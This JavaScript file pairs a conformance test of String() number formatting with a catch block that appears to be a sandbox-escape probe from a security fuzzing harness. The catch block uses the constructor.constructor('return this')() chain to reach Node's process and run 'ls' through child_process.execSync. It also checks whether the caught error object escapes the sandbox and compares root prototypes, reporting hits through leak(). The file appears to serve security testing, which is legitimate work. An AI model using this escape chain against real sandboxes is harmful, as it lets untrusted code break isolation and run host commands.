try {
    if (String(1.2345) !== '1.2345') {
        $ERROR('#1: String(1.2345) === "1.2345". Actual: ' + String(1.2345));
    }
    if (String(1.23456789) !== '1.23456789') {
        $ERROR('#2: String(1.234567890) === "1.23456789". Actual: ' + String(1.23456789));
    }
    if (String(0.12345) !== '0.12345') {
        $ERROR('#3: String(0.12345) === "0.12345". Actual: ' + String(0.12345));
    }
    if (String(0.012345) !== '0.012345') {
        $ERROR('#4: String(.012345) === "0.012345". Actual: ' + String(0.012345));
    }
    if (String(0.0012345) !== '0.0012345') {
        $ERROR('#5: String(.0012345) === "0.0012345". Actual: ' + String(0.0012345));
    }
    if (String(0.00012345) !== '0.00012345') {
        $ERROR('#6: String(.00012345) === "0.00012345". Actual: ' + String(0.00012345));
    }
    if (String(0.000012345) !== '0.000012345') {
        $ERROR('#7: String(.000012345) === "0.000012345". Actual: ' + String(0.000012345));
    }
    if (String(0.0000012345) !== '0.0000012345') {
        $ERROR('#8: String(.0000012345) === "0.0000012345". Actual: ' + String(0.0000012345));
    }
    if (String(1.2345e-7) !== '1.2345e-7') {
        $ERROR('#9: String(.00000012345) === "1.2345e-7". Actual: ' + String(1.2345e-7));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}